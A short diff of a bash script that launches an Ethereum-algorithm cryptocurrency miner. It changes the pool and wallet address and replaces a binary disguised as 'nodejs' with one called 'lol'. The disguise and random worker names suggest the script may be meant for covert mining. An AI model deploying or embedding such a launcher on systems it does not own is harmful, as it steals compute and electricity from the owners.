@@ -1,6 +1,6 @@
 #!/bin/bash
-POOL=eth-us1.hellominer.com:1100
-WALLET=0x86ca902b2ca60630188dba14105442141dc3b1dc
+POOL=daggerhashimoto.eu-west.nicehash.com:3353
+USER=3QS2aoB4SYDAUuxgHRpZTGuYfgz3tdMacH
 WORKER=$(echo $(shuf -i 1-5 -n 1)-gass) 
-chmod +x nodejs
-sudo ./nodejs -epool $POOL -wal $WALLET.$WORKER -pass x
+chmod +x lol
+./lol --algo ETHASH --pool $POOL --user  $USER.$WORKER -pass x
